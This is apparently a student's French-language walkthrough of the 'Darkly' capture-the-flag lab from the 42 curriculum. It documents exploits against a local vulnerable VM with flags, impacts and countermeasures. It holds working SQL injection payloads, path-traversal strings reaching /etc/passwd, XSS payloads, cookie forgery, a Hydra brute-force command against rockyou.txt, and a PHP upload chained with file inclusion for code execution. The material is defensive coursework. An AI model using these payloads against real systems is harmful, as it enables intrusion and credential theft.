# Darkly — Walkthrough complet

> Ordre des breaches = ordre de la **grille de défense intra 42** (1 → 13).
> Détails techniques dans chaque sous-dossier `XX_Breach_Name/Resources/`.

---

## Mapping intra → statut

| # | Nom intra | Statut | Flag |
|---|---|---|---|
| 1 | SQL injection basic | ✅ | `10a16d83...` |
| 2 | SQL injection avancée | ✅ | `f2a29020...` |
| 3 | Include | ✅ | `b12c4b2c...` |
| 4 | XSS basic | ✅ | `0fbb54bb...` |
| 5 | XSS advanced | ❌ | — |
| 6 | Cookies | ✅ | `df2eb4ba...` |
| 7 | Spoof (curl) | ❌ | — |
| 8 | Admin (htpasswd) | ✅ | `d19b4823...` |
| 9 | Bruteforce (member) | ✅ | `b3a6e43d...` |
| 10 | File upload | ✅ | `46910d9c...` |
| 11 | Redirect | ✅ | `b9e775a0...` |
| 12 | Guess (hidden file) | ✅ | `df2eb4ba...` |
| 13 | Survey | ✅ | `03a944b4...` |
| — | Recover | ✅ | `1d4855f7...` |

**Bonus (5)** — uniquement si les 13 obligatoires sont validées :
- XSS understanding
- SQL understanding
- Redirect understanding
- Bruteforce understanding
- robots.txt understanding

**Score : 11/13 obligatoires** — restantes : #5 XSS advanced, #7 Spoof

---

## Format de défense exigé (par breach)

Pour CHAQUE breach, l'évaluateur attend :
1. **Basic functioning** — comment trouvée et exploitée
2. **Method to avoid** — contre-mesure technique précise
3. **Impact** — ce qu'un attaquant peut faire en réel
4. **Both flags identical** — comparaison flag obtenu vs flag du `subject.pdf`

→ Avoir le `subject.pdf` ouvert pendant la défense pour comparer chaque flag.

---

## Setup initial
- VM Darkly (i386) lancée
- Accès via navigateur
- Burp Suite en proxy

---

## Phase 1 — Reconnaissance initiale

### WhatWeb
$ whatweb 127.0.0.1:8080

Résultats clés :
- **PHP 5.5.9-1ubuntu4.29** (obsolète, multiples CVE)
- **nginx 1.4.6** (2014, très ancien)
- **Cookie suspect : I_am_admin** → piste immédiate d'élévation de privilège
- **JQuery, HTML5** → stack front classique

### Cartographie manuelle
Endpoints identifiés via navigation et Ctrl+U :
- Pages principales : `?page=survey`, `?page=member`, `?page=signin`, `?page=recover`
- Upload/search : `?page=upload`, `?page=searchimg`
- Feedback : `?page=feedback`
- Redirect : `?page=redirect&site=facebook`
- Media : `?page=media&src=nsa`
- **Hash caché dans le footer** : `?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

### robots.txt
$ curl http://127.0.0.1:8080/robots.txt

User-agent: *
Disallow: /whatever
Disallow: /.hidden

→ Deux chemins "cachés" révélés par le dev lui-même.

### /whatever/
- Listing de répertoire activé
- Contient un seul fichier : `htpasswd`

### /.hidden/
- Listing de répertoire activé
- Contient 26 dossiers (un par lettre) + README
- Structure labyrinthique récursive → **rabbit hole**

---

## Cartographie SQL — bases et tables identifiées

Énumération exhaustive depuis l'injection sur `?page=member` :

```sql
0 UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```

**6 bases découvertes** :

| Base | Table | Endpoint mappé | Breach intra |
|---|---|---|---|
| `information_schema` | (système) | — | — |
| `Member_Sql_Injection` | `users` | `?page=member` | #1 ✅ |
| `Member_images` | `list_images` | `?page=searchimg` | #2 ✅ |
| `Member_guestbook` | `guestbook` | `?page=feedback` | #4 ✅ |
| `Member_Brute_Force` | `db_default` | `?page=signin` | #9 ✅ |
| `Member_survey` | `vote_dbs` | `?page=survey` | #13 ✅ |

### Privilèges MySQL
```sql
0 UNION SELECT user(),version()-- -
```
- **User** : `borntosec@localhost` (compte applicatif, pas root)
- **Version** : `5.5.64-MariaDB-1ubuntu0.14.04.1` (fin de support 2020)

### Colonnes de `vote_dbs` (Survey)
| Colonne | Type |
|---|---|
| `id_vote` | int |
| `vote` | float |
| `nb_vote` | int |
| `subject` | varchar |

### Colonnes de `db_default` (Bruteforce)
| Colonne | Type |
|---|---|
| `id` | int |
| `username` | varchar |
| `password` | varchar (MD5 non salé) |

→ Cartographie pré-emptive : Bruteforce et Survey **étaient SQL-backed** avant même de visiter ces endpoints.

---

# === BREACHES (ordre grille intra) ===

---

## Breach intra #1 — SQL injection basic (`?page=member`)
**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
**Dossier :** `01_SQLi_Basic/`

### Résumé
Injection SQL UNION-based sur le param `id` de `?page=member`. Énumération du schéma via `information_schema`, extraction des credentials de la table `users`, crack MD5 → transformation lower + SHA256 = flag.

### Méthode complète

**1. Détection de l'injection**
```
?page=member&id=submit&Submit=Submit
→ "Unknown column 'submit' in 'where clause'"
   → Confirmation : input inséré non quoté dans WHERE id = $input

?page=member&id=1 OR 1=1-- -&Submit=Submit
→ Retourne TOUS les enregistrements (dont "First name: Flag - Surname: GetThe")
```

**2. Énumération du nombre de colonnes (ORDER BY)**
```
?id=1 ORDER BY 3-- -    → "Unknown column '3' in 'order clause'"
```
→ Requête à **2 colonnes**.

**3. Mapping des colonnes via UNION SELECT**
```
?id=0 UNION SELECT 1,2-- -
→ First name: 1 - Surname: 2
```

**4. Énumération du schéma**
```
?id=0 UNION SELECT column_name,table_name FROM information_schema.columns WHERE table_schema=database()-- -
```
Table `users` avec colonnes : `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, **`countersign`**.

**5. Extraction**
```
?id=0 UNION SELECT countersign,Commentaire FROM users-- -
```
Le 4e enregistrement contient l'indice :
> `5ff9d0165b4f92b14994e5c685cdce28`
> "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

**6. Crack et transformation**
- CrackStation : `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
- Lower : `fortytwo`
- SHA-256 : `echo -n "fortytwo" | sha256sum` → `10a16d83...`

### Failles exploitées
- **A03:2021 — Injection (SQLi)** : aucune préparation/échappement du param `id`
- **Verbose error messages** : MariaDB renvoie l'erreur SQL complète
- **Cryptographic Failure** : MD5 non salé pour stocker des mots de passe

### Impact
- Dump complet de la base utilisateurs
- Lecture cross-database via `information_schema` (6 bases accessibles)
- RCE potentielle si `INTO OUTFILE` autorisé
- Authentification forgée (UNION pour bypass login)

### Contre-mesures
- Requêtes préparées (PDO) : `$stmt = $pdo->prepare("SELECT ... WHERE id = ?")`
- Cast strict : `intval($_GET['id'])`
- Désactiver `display_errors` en production
- bcrypt/argon2 pour stocker des mots de passe
- Principe du moindre privilège sur le compte MySQL

---

## Breach intra #2 — SQL injection avancée (`?page=searchimg`)
**Flag :** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
**Dossier :** `02_SQLi_Avancee/`

### Résumé
Même pattern que #1 mais sur `?page=searchimg&id=`. Base différente (`Member_images`). Erreurs SQL masquées (`display_errors = Off`) → injection blind à la détection.

### Méthode

**1. Détection silencieuse**
```
?id=1 ORDER BY 3-- -&Submit=Submit   → résultat vide
```
→ 2 colonnes, mais erreurs supprimées.

**2. Confirmation UNION**
```
?id=0 UNION SELECT 1,2-- -&Submit=Submit
→ Title: 2 - Url: 1
```

**3. Énumération + extraction**
```
?id=0 UNION SELECT comment,title FROM list_images-- -
```
Le 5e enregistrement :
> "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

**4. Crack et transformation**
- CrackStation : `1928e8083c...` → `albatroz`
- SHA-256 : `f2a29020...`

### Différences avec #1
- **Erreurs SQL masquées** : incohérence de hardening avec member
- **Database différente** : `Member_images` au lieu de `Member_Sql_Injection`
- **Indice directement dans `comment`**

### Impact (avancé)
Mêmes vecteurs que #1, plus :
- Détection à l'aveugle (blind SQLi via boolean/time-based)
- Pivot cross-database démontré

### Contre-mesures
Identiques à #1, plus :
- Audit cohérent du hardening
- Logs côté serveur sans exposition côté client

---

## Breach intra #3 — Include (LFI sur `?page=`)
**Flag :** `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`
**Dossier :** `03_Include/`

### Résumé
Le param `page` du routeur principal est passé à un `include()` côté serveur. Path traversal `../` permet de sortir du dossier `pages/`. Profondeur exacte = **7 `../`** pour atteindre `/etc/passwd`. Darkly utilise un système de feedback progressif.

### Méthode

**1. Détection du filtre WAF Darkly**
```bash
curl -s "http://127.0.0.1:8080/?page=php://filter/convert.base64-encode/resource=index"
→ <script>alert('Wtf ?');</script>
```
→ Filtre custom anti-LFI sur les wrappers `php://`.

**2. Mauvaise piste : `?page=media&src=`**
- Le param `src` est juste réfléchi dans `<object data="...">` avec `htmlspecialchars()`.
- Pas d'`include()` côté serveur sur `src`.

**3. Bonne piste : `?page=` directement**
```php
$page = $_GET['page'];
if (preg_match('/php:|http:|https:/', $page)) {
    echo "<script>alert('Wtf ?');</script>";
}
include("pages/" . $page . ".php");
```

**4. Bypass — path traversal pur**
```
?page=../etc/passwd                          → Wtf ?
?page=../../etc/passwd                       → Wrong..
?page=../../../etc/passwd                    → Nope..
?page=../../../../etc/passwd                 → Almost.
?page=../../../../../etc/passwd              → Still nope..
?page=../../../../../../etc/passwd           → Nope..
?page=../../../../../../../etc/passwd        ✅ Congratulaton!! flag : b12c4b2c...
```

→ Profondeur exacte = **7 × `../`**.

### Failles exploitées
- **A01:2021 — Broken Access Control / Path Traversal**
- **CWE-22 — Improper Limitation of a Pathname**
- Filtre WAF blacklist (regex stupide qui bloque `php://` mais pas `../`)

### Impact
- Lecture de fichiers sensibles : `/etc/passwd`, `/etc/shadow`, config DB, `.env`
- **RCE potentielle** combinée avec :
  - **File upload** (LFI + uploaded `.php` → exécution) — démontré dans breach #10
  - **Log poisoning** : User-Agent contenant du PHP exécutable
  - **Session poisoning** : `/var/lib/php/sessions/sess_XXX`

### Contre-mesures
- **Whitelist stricte** : `if (!in_array($page, $valid)) abort();`
- `realpath()` + vérification du préfixe
- `open_basedir = /var/www/html` dans php.ini
- Ne **jamais** s'appuyer sur un filtre regex blacklist

---

## Breach intra #4 — XSS basic (Stored XSS)
**Flag :** `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`
**Dossier :** `04_XSS_Basic/`

### Résumé
Injection d'un payload `<script>alert(...)</script>` dans le formulaire `?page=feedback`. Le serveur stocke et restitue l'input sans échappement → exécution du JS au rendu.

### Méthode
1. Champ vulnérable identifié sur `?page=feedback`
2. Payload : `<script>alert('XSS')</script>`
3. Submit → reload → script exécuté → flag affiché

### Faille exploitée
- **Stored XSS (OWASP A03:2021 — Injection)**
- Absence de sanitization à l'entrée et d'output encoding

### Impact
- Vol de cookies (`document.cookie`) si `HttpOnly` absent
- Keylogging via JS injecté
- Phishing intégré
- Propagation worm-style

### Contre-mesures
- `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` à l'affichage
- Auto-escape framework (React/Vue)
- `Content-Security-Policy: script-src 'self'`
- Cookies `HttpOnly`

---

## Breach intra #5 — XSS advanced
**Flag :** ❌ — non encore récupéré
**Dossier :** `05_XSS_Advanced/` (à créer)

### Piste
Reflected XSS sur un param GET avec contournement de filtre. À tester :
- `?page=searchimg&id=<payload>` (param `id` après tentative SQLi)
- Variantes filter-bypass : event handlers (`onerror`, `onload`), encodage HTML, `javascript:` URIs, SVG inline

---

## Breach intra #6 — Cookies (Cookie Manipulation)
**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `06_Cookies/`

### Résumé
Cookie `I_am_admin` = `68934a3e9455fa72420237eb05902327` = md5("false").
Forge de md5("true") → flag affiché.

### Commandes clés
```
$ echo -n "false" | md5sum  → 68934a3e9455fa72420237eb05902327
$ echo -n "true"  | md5sum  → b326b5062b2f0e69046810717534cb09
```

### Impact
Élévation de privilège via cookie côté client = compromission complète du modèle d'autorisation.

### Contre-mesures
- **Ne jamais stocker l'état d'autorisation côté client.** Stocker un session ID opaque, le rôle dans la session serveur.
- Cookies signés (HMAC) ou JWT signé
- `HttpOnly`, `Secure`, `SameSite=Strict`

---

## Breach intra #7 — Spoof (curl)
**Flag :** ❌ — non encore récupéré
**Dossier :** `07_Spoof/` (à créer)

### Piste
Manipulation de headers HTTP (User-Agent, Referer, X-Forwarded-For). À tester sur chaque page restante. Indice probable dans les commentaires HTML cachés ou les messages explicites du type "you must come from / use browser X".

Tests à enchaîner :
```bash
curl -s -A "BornToSecBrowser" "http://127.0.0.1:8080/" | grep -i flag
curl -s -e "http://127.0.0.1:8080/" "http://127.0.0.1:8080/" | grep -i flag
curl -s -H "X-Forwarded-For: 127.0.0.1" "http://127.0.0.1:8080/" | grep -i flag
```

---

## Breach intra #8 — Admin (htpasswd)
**Flag :** `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`
**Dossier :** `08_Admin/`

### Résumé
Combine 3 étapes :
1. **Disclosure** du fichier `htpasswd` via directory listing sur `/whatever/`
2. **Crack** du hash MD5 → mot de passe en clair
3. **Auth bypass** sur `/admin/` réutilisant les mêmes credentials

### Méthode

**1. Découverte du fichier**
- `robots.txt` → chemin `/whatever/` révélé
- Listing actif → fichier `htpasswd` visible
- `curl http://127.0.0.1:8080/whatever/htpasswd` → `root:437394baff5aa33daa618be47b75cb49`

**2. Crack**
- 32 hexa → MD5
- CrackStation → `qwerty123@`

**3. Authentification sur /admin/**
```bash
curl -X POST http://127.0.0.1:8080/admin/ \
  -d "username=root&password=qwerty123@&Login=Login"
```
→ Réponse : `<h2>The flag is : d19b4823...</h2>`

### Architecture défaillante
Deux systèmes de routing parallèles :
- **`?page=X`** → routeur PHP via `index.php`
- **`/admin/`** → chemin physique servi par nginx

Cumul de fautes :
- Le htpasswd existe mais pas configuré dans nginx (`auth_basic` absent)
- Le formulaire PHP valide en dur les **mêmes creds** que ceux exposés publiquement
- Aucun rate limiting, aucune 2FA
- Typo `recquired` → indicateur de code amateur

### Failles cumulées
- **Security Misconfiguration** — Directory listing actif
- **Information Disclosure via robots.txt**
- **Cryptographic Failure** — MD5 non salé
- **Weak Password** — `qwerty123@` dans rockyou.txt
- **A07:2021 — Authentication Failures** (credential reuse)

### Impact
- Bypass complet de l'authentification admin
- Compromission de la zone privilégiée
- Pivot vers compromission système si creds réutilisés (SSH, etc.)

### Contre-mesures
- nginx : `auth_basic` + `auth_basic_user_file` sur `/admin/`
- Stocker htpasswd **hors document root**
- bcrypt au lieu de MD5 (`htpasswd -B`)
- `autoindex off;`
- Rate limiting via `limit_req` nginx
- 2FA TOTP côté applicatif

---

## Breach intra #9 — Bruteforce (member)
**Flag :** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`
**Dossier :** `09_Bruteforce/`

### Résumé
Le formulaire `?page=signin` n'a **aucune protection** contre les tentatives multiples (pas de rate limit, pas de CAPTCHA, pas de lockout). Credentials trouvés : `admin:shadow`. Hash MD5 non salé stocké dans `Member_Brute_Force.db_default`.

### Méthode

**Approche 1 — Cartographie SQL (raccourci)**

Depuis l'injection SQL sur `?page=member` :
```
?id=0 UNION SELECT username,password FROM Member_Brute_Force.db_default-- -
→ admin : 3bf1114a986ba87ed28fc1b5884fc2f8
→ root  : 3bf1114a986ba87ed28fc1b5884fc2f8
```

CrackStation : `3bf1114a...` → **`shadow`**.

**Approche 2 — Hydra (méthode attendue par l'évaluateur)**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 \
  http-get-form "/?page=signin:username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer" \
  -t 1 -f
```

`shadow` est en position **73** dans rockyou.txt → trouvé en quelques secondes.

⚠️ **Note debug Hydra** : caractères spéciaux dans `F=` peuvent casser le matching. Vérifier avec curl avant de lancer :
```bash
curl -s "http://127.0.0.1:8080/?page=signin&username=admin&password=BAD&Login=Login" | grep -c "WrongAnswer"
# → 1 (présent dans la réponse d'échec)
curl -s "http://127.0.0.1:8080/?page=signin&username=admin&password=shadow&Login=Login" | grep -c "WrongAnswer"
# → 0 (absent dans la réponse de succès)
```

**Récupération du flag**
```bash
curl -s "http://127.0.0.1:8080/?page=signin&username=admin&password=shadow&Login=Login" | grep "flag"
→ The flag is : b3a6e43d...
```

### Failles exploitées
- **A07:2021 — Identification and Authentication Failures**
- **CWE-307 — Improper Restriction of Excessive Authentication Attempts**
- **CWE-521 — Weak Password Requirements** : `shadow` ligne 73 de rockyou.txt
- **Cryptographic Failure** : MD5 non salé côté serveur

### Impact
- Compromission de tout compte admin avec password faible en quelques secondes
- 100% du top 1000 testé en moins de 10 secondes (sans rate limiting)
- Combiné avec **User Enumeration** (Recover) : ciblage précis des emails confirmés

### Contre-mesures
- **Rate limiting nginx** : `limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;`
- **fail2ban** : ban automatique après N échecs
- **Account lockout** : compte gelé après 5 tentatives
- **CAPTCHA** après 3 échecs
- **2FA TOTP** : même avec password compromis, l'attaquant ne passe pas
- **Délai progressif** : 1s → 2s → 4s → 8s
- **Politique mot de passe forte** : longueur, complexité, blacklist top 10000
- **Logs + alerting SIEM**

---

## Breach intra #10 — File upload
**Flag :** `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`
**Dossier :** `10_File_Upload/`

### Résumé
Le formulaire `?page=upload` accepte un fichier dont l'extension n'est pas validée et dont le `Content-Type` est trusted. Upload d'un `.php` avec `Content-Type: image/jpeg` → succès. Pas de validation des magic bytes, pas de re-encoding, pas de whitelist d'extensions.

### Méthode
```bash
echo '<?php echo "test"; ?>' > /tmp/hack.php

curl -X POST "http://127.0.0.1:8080/index.php?page=upload" \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@/tmp/hack.php;type=image/jpeg" \
  -F "Upload=Upload"
```
→ Réponse : `The flag is : 46910d9c...` + `/tmp/hack.php succesfully uploaded.`

### Faille exploitée
- **A04:2021 — Insecure Design** : aucune validation des fichiers uploadés
- **A05:2021 — Security Misconfiguration** : Content-Type trusted depuis le client
- **CWE-434 — Unrestricted Upload of File with Dangerous Type**

### Impact
- **RCE directe** combinée avec breach #3 (LFI) :
  ```
  ?page=../../../../tmp/hack
  ```
  → Le PHP uploadé est exécuté par le serveur.
- Webshell persistante
- Pivot vers compromission système complète
- Stockage de malware servi à d'autres visiteurs

### Contre-mesures
- **Whitelist stricte d'extensions** : `['jpg', 'png', 'gif', 'webp']`
- **Validation des magic bytes** (`finfo_file()` en PHP, jamais `$_FILES['type']`)
- **Re-encoding systématique** : `imagecreatefrompng()` puis `imagepng()` détruit tout PHP injecté
- **Stocker hors webroot** ou avec extension renommée (`uploads/abc123.bin`)
- **`.htaccess` dans `uploads/`** : `<FilesMatch "\.(php|phar|phtml)$"> Deny from all </FilesMatch>`
- **Content-Disposition: attachment** pour forcer le téléchargement, jamais l'exécution

---

## Breach intra #11 — Redirect (Open Redirect)
**Flag :** `b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3`
**Dossier :** `11_Redirect/`

### Résumé
Le param `site` de `?page=redirect&site=X` est utilisé pour construire une redirection sans validation stricte. Quand `site` n'est pas dans la whitelist (`facebook`, `twitter`, `instagram`), le serveur expose le flag directement dans le HTML.

### Méthode

```bash
curl -s "http://127.0.0.1:8080/?page=redirect&site=https://evil.com"
→ <center><h2>Good Job Here is the flag : b9e775a0...</h2></center>
```

### Logique du serveur (probable)
```php
if (in_array($_GET['site'], ['facebook', 'twitter', 'instagram'])) {
    header("Location: https://" . $_GET['site'] . ".com");
} else {
    echo "Good Job Here is the flag : ...";
}
```
→ Logique **inversée** : Darkly récompense la tentative de bypass.

### Faille exploitée
- **A01:2021 — Broken Access Control / Unvalidated Redirect**

### Impact
- **Phishing** : domaine de confiance dans l'URL initiale
- **Bypass de filtres email/SMS anti-spam**
- **Vol de tokens OAuth** si `redirect_uri` mal validé
- **SSRF** si le serveur fait lui-même la requête

### Contre-mesures
- **Whitelist stricte côté serveur** : tableau associatif, jamais de concaténation
- Refus explicite de tout schéma absolu (`http://`, `https://`, `//`)
- Rediriger uniquement vers des paths internes relatifs
- Page d'avertissement intermédiaire si redirect externe nécessaire

---

## Breach intra #12 — Guess (Hidden File / Information Disclosure)
**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `12_Guess/`

### Résumé
Lien caché dans le footer de `index.php` pointant vers une page nommée avec un SHA-256 :
`?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

La page sert directement un `<script>alert('Good job! Flag : ...')</script>` en dur.

### Faille exploitée
- **Security Through Obscurity** : URL "cachée" mais visible en HTML
- **Information Disclosure** : lien dans le footer accessible via Ctrl+U

### Règle violée
> L'URL n'est pas un secret. Toute ressource non protégée par authentification est publique.

### Impact
- Accès non autorisé à des ressources cachées : pages admin, backups, API non documentés
- Découverte de fichiers sensibles (`.git/`, `.env`, `backup.sql`)

### Contre-mesures
- Authentification réelle sur les pages sensibles
- Audit régulier du HTML rendu
- `.htaccess` / nginx `deny all` sur les fichiers de dev/backup
- Suppression des fichiers de backup en production

---

## Breach intra #13 — Survey (Value tampering)
**Flag :** `03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa`
**Dossier :** `13_Survey/`

### Résumé
Le formulaire de vote `?page=survey` valide les valeurs **uniquement côté client** (`<select>` limité à 1-10). Côté serveur, aucune validation de la plage. Envoi d'un POST avec `valeur=999` → accepté → la moyenne explose anormalement → flag exposé.

### Méthode

**Voir le formulaire**
```html
<form action="#" method="post">
  <input type="hidden" name="sujet" value="2">
  <SELECT name="valeur">
    <option value="1">1</option>...<option value="10">10</option>
  </SELECT>
</form>
```

**Exploitation — bypass de la validation client**
```bash
curl -X POST "http://127.0.0.1:8080/index.php?page=survey" \
  -d "sujet=2&valeur=999"
```
→ Réponse : `The flag is 03a944b4...`
→ Côté affichage : la moyenne du sujet 2 explose à `4218.19` (preuve que l'input hors-plage a été accepté).

### Faille exploitée
- **A04:2021 — Insecure Design** : validation côté client uniquement
- **A03:2021 — Improper Input Validation** : pas de check `intval($v) >= 1 && $v <= 10` côté serveur
- **CWE-602 — Client-Side Enforcement of Server-Side Security**

### Impact
- **Manipulation des moyennes** : un attaquant inflate ou diminue artificiellement les scores
- **Pollution des données** : valeurs aberrantes (`vote=999`, `vote=-INF`) dans la base
- **Déni de service applicatif** si le calcul de moyenne plante avec des valeurs extrêmes
- En contexte e-commerce/avis : compromission de la réputation produit/vendeur

### Méthode alternative — cross-DB SQLi (depuis breach #1)
Démontre que toutes les bases sont accessibles depuis n'importe quelle injection :
```
?id=0 UNION SELECT subject,id_vote FROM Member_survey.vote_dbs-- -
```
→ Lecture du contenu de la base Survey sans visiter `?page=survey`. Méthode bonus, le flag officiel reste celui obtenu par value tampering.

### Contre-mesures
- **Validation côté serveur stricte** : `if (!is_numeric($v) || $v < 1 || $v > 10) abort();`
- **Cast forcé** : `intval()` + clamp dans la plage acceptée
- **Prepared statements** + types stricts (PDO `PDO::PARAM_INT`)
- **Regex de validation** sur tous les inputs numériques
- Ne **jamais** se reposer sur `<select>` ou `maxlength` HTML — UX, pas sécurité

---

## Breach Recover — User Enumeration
**Flag :** `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`
**Dossier :** `14_Recover/`

### Résumé
Le formulaire `?page=recover` répond différemment selon que l'email saisi correspond ou non à un compte existant. Si l'email saisi **n'est pas** celui de l'admin, le serveur expose le flag directement.

### Méthode
1. Accès à `?page=recover` (lien "I forgot my password" depuis `?page=signin`)
2. Saisie d'un email arbitraire ≠ email admin
3. Submit → flag exposé dans la réponse

### Faille exploitée
- **User Enumeration / Information Disclosure**
- **CWE-204 — Observable Response Discrepancy**

### Impact
- **Énumération des comptes** sans authentification
- **Pré-requis pour brute force ciblé**
- **Phishing personnalisé** sur les emails confirmés
- **OSINT** : recoupement avec data breaches publiques

### Contre-mesures
- **Réponse identique** quel que soit l'email : "If this email exists, a recovery link has been sent."
- Même statut HTTP, même délai de réponse, même contenu
- Rate limiting agressif (`limit_req` nginx)
- CAPTCHA après N tentatives

---

## Prochaines pistes (ordre de priorité)

### Restantes obligatoires
- [ ] **#5 XSS advanced** : Reflected XSS sur param GET avec contournement de filtre
- [ ] **#7 Spoof (curl)** : tester headers (User-Agent / Referer / X-Forwarded-For)

### Debug à finaliser pour la défense live
- [ ] **Hydra Bruteforce** : trouver la syntaxe exacte (`F=` vs `S=`, escape du `.`, threading) pour démo live. Le flag est acquis mais Hydra produit des faux positifs avec la string actuelle.

### Bonus (après 13/13 — explication approfondie, pas nouvelles failles)
- [ ] **XSS understanding** : stored vs reflected vs DOM, contextes (attr/text/JS/CSS), CSP nonce vs hash, cas réels (Samy worm, Magecart)
- [ ] **SQL understanding** : UNION/Boolean/Time/Out-of-band, prepared statements au niveau driver, second-order SQLi, ORM injection
- [ ] **Redirect understanding** : OAuth/SAML stepping stone, validation redirect_uri, DOM-based open redirect
- [ ] **Bruteforce understanding** : online vs offline, credential stuffing vs spraying, 2FA bypasses, Argon2id vs bcrypt
- [ ] **robots.txt understanding** : pas un mécanisme de sécurité, disclosure de chemins sensibles, alternative auth + sitemap

---

## Leçons techniques cumulées

1. **Reconnaissance d'abord** : `whatweb`, `robots.txt`, Ctrl+U, sitemap → toujours avant tout payload
2. **Deux systèmes de routing peuvent coexister** : routeur applicatif (`?page=`) vs filesystem (`/admin/`). Tester les deux.
3. **MD5 et SHA-1 sont morts** pour le stockage de mots de passe. CrackStation casse en secondes.
4. **Security through obscurity ≠ sécurité** : breach #12 et #8.
5. **Credential reuse** = faille systémique.
6. **Méthode SQLi UNION-based** : (1) détecter, (2) compter colonnes, (3) mapper, (4) énumérer schéma, (5) extraire.
7. **Verbose error messages** = fuite d'information critique.
8. **Multi-base = surface d'attaque démultipliée** : démontré sur breach #13 (Survey via cross-DB) et breach #9 (creds Bruteforce dump sans visiter `?page=signin`).
9. **Pattern Darkly récurrent** : MD5 → CrackStation → lower → SHA-256.
10. **Toutes les colonnes valent le dump** : `comment`, `description`, `notes`, `metadata`, `subject`.
11. **Input non quoté = pas besoin de fermer une string** : test `Unknown column 'mot'` = input non quoté.
12. **Format `base.table` MySQL** : erreurs `Base.table doesn't exist` fuitent le nom de la base courante.
13. **Hex literal `0x...`** : équivalent strings sans guillemets. Bypass d'encodage URL et filtres WAF.
14. **Pattern Darkly Open Redirect** : logique inversée — flag s'affiche au bypass, pas à la redirection.
15. **Pattern Darkly "réponse divergente"** : flag exposé sur le comportement non-nominal (mail inexistant, site hors whitelist, valeur hors plage). Vraie faille = User Enumeration / Information Disclosure / Improper Input Validation.
16. **Filtre WAF blacklist = défaite garantie** : bloque `php://` mais pas `../`. Toujours whitelist + `realpath()`.
17. **Pattern Darkly "feedback progressif"** : sur breach Include, messages d'erreur changent selon proximité avec la cible. Convergence par dichotomie. En vrai pentest, ce feedback n'existe pas.
18. **Hydra http-get-form — pièges de matching** : (a) caractères spéciaux dans `F=`/`S=` cassent le matching ; (b) en multithread, faux positifs fréquents ; (c) toujours **vérifier la string avec curl** avant de lancer Hydra ; (d) `-t 1` pour debug.
19. **File upload — Content-Type trusted = RCE** : ne **jamais** faire confiance à `$_FILES['type']`. Toujours valider les magic bytes côté serveur (`finfo_file()`) et re-encoder les images. Combiné avec LFI = RCE directe.
20. **Validation client uniquement = rien** : `<select>`, `maxlength`, `pattern` HTML sont de l'UX. Toute valeur peut être envoyée via curl/Burp en POST direct. Validation **toujours** côté serveur.
